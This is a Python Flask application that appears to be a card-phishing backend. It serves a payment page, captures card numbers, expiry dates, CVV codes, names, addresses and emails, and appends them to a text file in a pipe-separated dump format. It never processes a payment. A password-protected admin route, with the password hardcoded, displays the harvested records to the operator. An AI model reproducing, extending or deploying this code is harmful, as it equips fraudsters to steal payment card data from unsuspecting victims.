from flask import Flask, render_template, request, redirect, flash, session

app = Flask(__name__)

# Set a secret key for session management
app.secret_key = 'uwhuckyugetk4yeskchceskgnhcisyumlixaufrxdisnxyg8hrcksehxfzril'

# File where data will be stored
DATA_FILE = "data.txt"

@app.route('/')
def index():
    return render_template("index.html")

@app.route("/admin", methods=["GET", "POST"])
def admin():
    if request.method == "POST":
        password = request.form.get("password")
        if password == "isfo1999":
            try:
                with open(DATA_FILE, "r") as file:
                    users = file.readlines()
                return render_template("admin.html", users=users)
            except FileNotFoundError:
                flash("No data found!", "error")
                return redirect("/admin")
        else:
            flash("Incorrect password!", "error")
            return redirect("/admin")
    return render_template("admin_login.html")

@app.route("/email", methods=["POST"])
def email():
    if request.method == "POST":
        user_email = request.form.get("email")
        if user_email:
            session["email"] = user_email
            return redirect(f"/carddetails?email={user_email}")
    return redirect("/carddetails")

@app.route("/carddetails", methods=["GET", "POST"])
def carddetails():
    if request.method == "POST":
        # Get form data
        name = request.form.get("name")
        email = session.get("email")
        cc_num = request.form.get("cc_num")
        exp_mo = request.form.get("exp_mo")
        exp_yr = request.form.get("exp_yr")
        cvv = request.form.get("cvv")
        address = request.form.get("address")
        city = request.form.get("city")
        state = request.form.get("state")
        zip_code = request.form.get("zip")

        # Format the data
        entry = f"{cc_num}|{exp_mo}|{exp_yr}|{cvv}|{name}|{address}|{city}|{state}|{zip_code}|{email}\n"
        
        # Save to file
        with open(DATA_FILE, "a") as file:
            file.write(entry)

        return redirect("/success")
    return render_template("payment.html")

@app.route("/success") 
def success():
    return render_template("thanks.html")   

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
